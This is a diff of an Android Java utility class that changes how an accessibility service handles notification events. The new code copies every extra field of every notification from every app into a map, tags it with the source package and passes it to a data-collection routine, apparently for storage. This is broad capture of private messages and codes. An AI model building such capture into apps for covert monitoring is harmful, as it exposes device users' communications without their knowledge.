@@ -1,6 +1,6 @@
 package com.vikasyadavnsit.cdc.utils;
 
-import static com.vikasyadavnsit.cdc.constants.AppConstants.BLANK_STRING;
+import static com.vikasyadavnsit.cdc.utils.CommonUtil.convertToString;
 
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Notification;
@@ -24,15 +24,14 @@ import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
 import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
 import com.vikasyadavnsit.cdc.enums.ClickActions;
 import com.vikasyadavnsit.cdc.enums.FileMap;
-import com.vikasyadavnsit.cdc.services.MyAccessibilityService;
-
-import org.apache.commons.lang3.StringUtils;
+import com.vikasyadavnsit.cdc.services.CDCAccessibilityService;
 
 import java.time.LocalDateTime;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.Objects;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -48,7 +47,7 @@ public class AccessibilityUtils {
     private static ApplicationDataRepository applicationDataRepository;
 
     public static void startAccessibilitySettingIntent(Context context) {
-        if (!isAccessibilityServiceEnabled(context, MyAccessibilityService.class)) {
+        if (!isAccessibilityServiceEnabled(context, CDCAccessibilityService.class)) {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             context.startActivity(intent);
         }
@@ -127,27 +126,30 @@ public class AccessibilityUtils {
     }
 
     public static void processNotificationEvent(AccessibilityEvent event) {
-        Notification notification = (Notification) event.getParcelableData();
-        NotificationData notificationData = NotificationData.builder().build();
-        if (Objects.nonNull(notification) && Objects.nonNull(notification.extras)) {
-            notificationData.setTitle(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_TITLE), BLANK_STRING).toString());
-            notificationData.setContent(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_TEXT),
-                    StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT), BLANK_STRING)).toString());
-            notificationData.setBigText(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT), BLANK_STRING).toString());
-            notificationData.setSubText(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_SUB_TEXT), BLANK_STRING).toString());
-            notificationData.setSummaryText(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT), BLANK_STRING).toString());
-            notificationData.setInfoText(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_INFO_TEXT), BLANK_STRING).toString());
-            notificationData.setConversationTitle(StringUtils.defaultIfBlank(notification.extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE), BLANK_STRING).toString());
-            notificationData.setExtras(Arrays.stream(notification.extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES))
-                    .map(CharSequence::toString).toArray(String[]::new));
-            notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(notification.when)).toString());
-        } else {
-            notificationData.setTitle(BLANK_STRING);
-            notificationData.setContent(event.getText().stream().collect(Collectors.joining(", ")));
-            notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(event.getEventTime())).toString());
+        try {
+            Notification notification = (Notification) event.getParcelableData();
+            NotificationData notificationData = NotificationData.builder().build();
+
+            if (Objects.nonNull(notification) && Objects.nonNull(notification.extras)) {
+                Map<String, Object> map = new HashMap<>();
+                for (String key : notification.extras.keySet()) {
+                    Object data = notification.extras.get(key);
+                    if (Objects.nonNull(data)) {
+                        map.put(key.replace(".", "_"), convertToString(data));
+                    }
+                }
+                notificationData.setExtras(map);
+                notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(notification.when)).toString());
+            } else {
+                notificationData.setExtras(Map.of("data", event.getText().stream().collect(Collectors.joining(", "))));
+                notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(event.getEventTime())).toString());
+            }
+            notificationData.setPackageName(event.getPackageName().toString());
+            collectNotificationData(notificationData);
+        } catch (Exception e) {
+            e.printStackTrace();
+            LoggerUtils.e("AccessibilityUtils", "Exception in processNotificationEvent :: " + e.getMessage());
         }
-        notificationData.setPackageName(event.getPackageName().toString());
-        collectNotificationData(notificationData);
     }
 
     private static void collectNotificationData(NotificationData notificationData) {
